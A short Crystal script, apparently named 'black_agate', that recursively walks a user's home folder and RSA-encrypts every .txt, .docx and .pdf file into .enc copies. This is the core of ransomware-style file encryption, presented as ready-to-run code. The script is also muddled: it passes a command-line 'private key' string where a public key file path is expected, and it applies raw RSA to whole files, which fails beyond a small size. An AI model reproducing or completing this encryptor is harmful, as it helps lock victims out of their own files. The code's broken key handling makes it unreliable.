require "openssl"

# Usage: crystal run encrypt_files.cr -- /path/to/home/folder "your_private_key_here"
# crystal build black_agate.cr
# Encrypts the file content using asymmetric encryption (RSA)
def encrypt_file(file_path : String, public_key_path : String)
  public_key = OpenSSL::PKey::RSA.new(File.read(public_key_path))
  
  # Read the file content
  file_content = File.read(file_path)
  
  # Encrypt the file content using the public key
  encrypted_data = public_key.public_encrypt(file_content)
  
  # Save the encrypted data to a new file
  File.write("#{file_path}.enc", encrypted_data)
  puts "File encrypted: #{file_path}.enc"
end

# Recursive method to find and encrypt files with specific extensions
def encrypt_files_in_directory(directory : String, private_key : String, extensions : Array(String))
  Dir.each_child(directory) do |entry|
    full_path = File.join(directory, entry)
    if File.directory?(full_path)
      encrypt_files_in_directory(full_path, private_key, extensions)
    elsif extensions.any? { |ext| full_path.ends_with?(ext) }
      encrypt_file(full_path, private_key)
    end
  end
end

# Main execution starts here
if ARGV.size != 2
  puts "Usage: crystal run encrypt_files.cr -- <directory_to_encrypt> <private_key>"
  exit
end

directory_to_encrypt = ARGV[0]
private_key = ARGV[1]
extensions_to_encrypt = [".txt", ".docx", ".pdf"] # etc

puts "Starting encryption process..."
encrypt_files_in_directory(directory_to_encrypt, private_key, extensions_to_encrypt)
puts "Encryption process completed."
